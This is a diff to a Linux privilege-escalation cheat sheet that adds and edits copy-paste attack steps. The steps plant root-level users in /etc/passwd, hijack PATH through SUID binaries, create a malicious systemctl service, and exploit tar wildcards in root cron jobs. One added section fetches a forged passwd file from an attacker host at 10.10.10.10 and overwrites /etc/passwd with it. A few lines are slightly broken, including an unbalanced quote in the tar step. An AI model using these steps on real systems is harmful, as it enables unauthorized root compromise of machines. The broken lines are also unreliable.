@@ -72,8 +72,8 @@ If you have write permission to the following files:
 
 /etc/passwd
 ```
-   echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
-   su - hacker
+   echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
+   su - root2
    id && whoami
    
 // Add new user to the system with GID and UID of 0   
@@ -95,11 +95,11 @@ OR
   
 OR
 
-openssl passwd NewRootPassword
+openssl passwd -1 -salt ignite NewRootPassword
 Copy output
-echo "hacker:<output>:0:0:root:/root:/bin/bash" > /etc/passwd
+echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
 Replace <output> with the copied output
-su hacker
+su root2
 id && whoami
   
 ```  
@@ -196,8 +196,6 @@ User www-data may run the following commands on <hostname>
 - (root) NOPASSWD: /usr/bin/flask run
 - (root) NOPASSWD: /usr/bin/apache2
 - (root) NOPASSWD: /usr/bin/wget
-
-
 
 
 Absuing Sudo binaries to gain root
@@ -419,8 +417,6 @@ id && whoami
 
 # Sudo LD_PRELOAD
 
-
-
 sudo -l 
 
 Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?
@@ -460,13 +456,14 @@ GUID permission is similar to the SUID permission, only difference is – when t
 Enumeration:
 
 ```
-find / -perm -u=s -type f 2>/dev/null 
-find / -perm -g=s -type f 2>/dev/null 
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
+find / -perm -g=s -type f 2>/dev/null | xargs ls -l
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null 
 
 // Look for any binaries that seem odd. Any binaries running from a users home directory?
 // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root
+
 
 ```
 
@@ -493,51 +490,33 @@ vi test.c
 void main()
 { setuid(0);
   setgid(0);
-  system("ps");
+  system("curl -I 127.0.0.1");
 
   }
 ```
 Compile Binary & Add SUID Bit
 
 ```
-gcc test.c -o test
-chmod u+s test
+gcc test.c -o network-tester
+chmod u+s network-tester
+mv network-tester /bin/tools/
 ```
+Example 1 (Without full bin path)
 
 Privilege Escalation
 
 ```
 Find the SUID Binary
 
-find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
-Output Example: /home/max/test
-ls -la /home/max/test 
-
-Absue the SUID Binary
-
-echo "/bin/bash" > /tmp/ps
-chmod 777 /tmp/ps
-echo $PATH
-export PATH=/tmp:$PATH
-/home/max/test
-id && whoami
-```
-Example 2 (Without full bin path)
-
-Privilege Escalation
-
-```
-Find the SUID Binary
-
-find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
-Output Example: /bin/tools/network-testerv1
-ls -la /bin/tools/network-testerv1
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
+Output Example: /bin/tools/network-tester
+ls -la /bin/tools/network-tester
 
 Test the SUID Binary 
 
-/bin/tools/network-testerv1
-strings /bin/tools/network-testerv1
-Output Example: curl -I http://localhost 
+/bin/tools/network-tester
+strings /bin/tools/network-tester
+Output Example: curl -I 127.0.0.1 
 
 Absue the SUID Binary
 
@@ -545,7 +524,7 @@ echo "/bin/bash" > /tmp/curl
 chmod 777 /tmp/curl
 echo $PATH
 export PATH=/tmp:$PATH
-/bin/tools/network-testerv1
+/bin/tools/network-tester
 id && whoami
 ```
 
@@ -556,7 +535,7 @@ Privilege Escalation
 ```
 Find the SUID Binary
 
-find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 Output Example: /bin/tools/webserver-status
 ls -la /bin/tools/webserver-status
 
@@ -584,7 +563,7 @@ Privilege Escalation
 ```
 Find the SUID Binary
 
-find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
 Output Example: /bin/tools/webserver-status
 ls -la /bin/tools/webserver-status
 
@@ -600,6 +579,52 @@ fucntion /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/b
 export -f /usr/sbin/service
 /bin/tools/webserver-status
 id && whoami
+```
+
+Example 5 (/bin/systemctl)
+
+Privilege Escalation
+
+Copy line by line inside the victim low priv shell
+```
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+/bin/bash -p
+id && whoami
+```
+
+Example 5 (Copy - /bin/cp)
+
+Privilege Escalation
+
+Victim
+```
+find / -perm -u=s -type f 2>/dev/null | xargs ls -l
+Copy the contents of /etc/passwd to your local machine inside a new file called "passwd"
+```
+Attacker
+```
+Run the following command locally: openssl passwd -1 -salt ignite NewRootPassword
+Copy the output
+Add the following inside the local passwd file
+echo "root2:<output>:0:0:root:/root:/bin/bash" >> passwd // Replace <output> with the copied output
+python -m SimpleHTTPServer 9000
+```
+Victim
+```
+wget -O /tmp/passwd http://10.10.10.10:9000/passwd
+cp /tmp/passwd /etc/passwd
+su root2
+Password: NewRootPassword
+id && whoami
+
+// Replace Attacker IP & Port
 ```
 # Cron Tabs & Scheduled Tasks
 
@@ -627,19 +652,8 @@ Privilege Escalation via Nonexistent File Overwrite
 ```
 cat /etc/crontab
 Output Example: * * * * * root systemupdate.sh
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/systemupdate.sh
+echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
 chmod +x /home/user/systemupdate.sh
-Wait a while
-/tmp/bash -p
-id && whoami
-
-OR
-
-cat /etc/crontab
-Output Example: * * * * * root systemupdate.sh
-echo "#!/bin/bash" > /home/user/systemupdate.sh
-echo "chmod +s /bin/bash" >> /home/user/systemupdate.sh
-chmod +x  /home/user/systemupdate.sh
 Wait a while
 /bin/bash -p
 id && whoami
@@ -738,6 +752,22 @@ Wait a while
 /bin/bash -p
 id && whomai
 ```
+Example 5
+
+Privilege Escalation via Tar Cron Job
+
+```
+cat /etc/crontab
+Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
+cd /var/www/html/
+echo "chmod +s /bin/bash" > priv.sh
+echo "" > "--checkpoint-action=exec=bash priv.sh
+echo "" > --checkpoint=1
+tar cf archive.tar *
+
+// If it does not work , replace "bash" with "sh"
+```
+
 
 # Capabilities
 
